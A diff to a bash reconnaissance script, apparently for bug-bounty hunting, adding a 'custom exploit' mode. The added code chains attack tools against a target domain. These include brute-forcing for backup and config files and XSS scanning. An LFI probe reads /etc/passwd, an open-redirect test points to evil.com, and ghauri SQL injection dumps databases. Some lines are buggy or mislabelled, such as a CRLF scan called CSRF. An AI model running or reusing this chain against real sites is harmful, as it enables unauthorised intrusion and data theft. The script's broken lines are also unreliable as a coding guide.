@@ -25,6 +25,7 @@ help() {
     echo -e "${BOLD}    --help            Shows the help menu${NC}"
     echo -e "${BOLD}    --scan           Subdomains/gau(website history)/pars{NC}"
     echo -e "${BOLD}    --exploit           Subenum + alive + params + vuln${NC}"
+    echo -e "$RED${BOLD}    --custom           Custom exploit modules ${NC}"
     exit 0
 }
 
@@ -111,6 +112,10 @@ vuln1() {
     echo -e "$green [+]$magenta Life Check "
     cat output/$domain/xss.txt | trashcompactor | anew output/$domain/reflected_alive.txt #FIX
     cat output/$domain/xss.txt | gxss -c 100 | anew output/$domain/gxss_dump.txt
+    echo -e "$yellow [+]$magenta Finding Hidden Files "
+    cat output/$domain/raw_urls.txt | grep -color -E ".xls | \\. xml | \\.xlsx | \\.json | \\. pdf | \\.sql | \\. doc| \\.docx | \\. pptx| \\.txt| \\.zip| \\.tar.gz| \\.tgz| \\.bak| \\.7z| \\.rar" | anew output/$domain/hidden_files.txt
+    dirsearch -l output/$domain/subs.txt -e conf,config,bak,backup,swp,old,db,sql,asp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip,log,xml,js,json --deep-recursive --force-recursive --exclude-sizes=0B --random-agent --full-url -o output/$domain/hidden_dir.txt
+
 }
 
 vuln2() {
@@ -129,12 +134,35 @@ vuln2() {
     cat ../output/$domain/params.txt | xargs -I @ sh -c './xray_linux_amd64 ws --url @ --plugins xss,sqldet,xxe,ssrf,cmd-injection,path-traversal,crlf-injection,dirscan --html-output ../output/$domain/xray/"xray_$(echo @ | tr / _).html"'
 }
 
+vuln3() {
+	echo -e "$RED$Custom Exploit Scan ${NC}"
+    echo -e "$CYAN$HTTP Scanning ${NC}"
+    httpx -silent -l output/$domain/subs.txt | anew output/$domain/alive.txt
+
+    echo -e "$CYANParameters search${NC}"
+    paramspider -l output/$domain/alive.txt && mv results output/$domain/
+    #cd results/
+    cat output/$domain/results/* > output/$domain/params.txt
+
+    echo -e "$RED${BOLD} \n Vulnerability Scanning \n${NC}"
+    cat output/$domain/gxss_dump.txt | dalfox pipe -o cat output/$domain/VULN_xss.txt
+    [ -s output/$domain/VULN_xss.txt ] && echo -e "$green${BOLD} [+] VULN XSS [+] ${NC}" || echo  -e "$RED [+] No XSS Found[+] ${NC}"
+    echo -e "$CYAN${BOLD} \n [!] CSRF [!] \n${NC}"
+    crlfuzz -l output/$domain/subs.txt -o output/$domain/VULN_csrf.txt
+    [ -s output/$domain/VULN_csrf.txt ] && echo -e "$green${BOLD} [+] VULN CSRF [+] ${NC}" || echo -e "$RED [+] No CSRF Found[+] ${NC}"
+
+    cat output/$domain/lfi.txt | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "LFI VULN! %"'
+    cat output/$domain/redirect.txt | grep -a -i \=http | qsreplace 'http://evil.com' | while read host do;do curl -s -L $host -I| grep "http://evil.com" && echo -e "$host \033[0;31m Open Redir. Vulnerable\n" ;done
+    cat output/$domain/sqli.txt | parallel -j 50 'ghauri -u '{}' --dbs --hostname --confirm --batch'
+}
+
 if [ "$1" == "--scan" ]; then
     vuln1
 elif [ "$1" == "--exploit" ]; then
     vuln2
+elif [ "$1" == "--custom" ]; then
+    vuln3
 else
     echo -e "${RED}Unknown option: $1 ${NC}"
     help
 fi
-
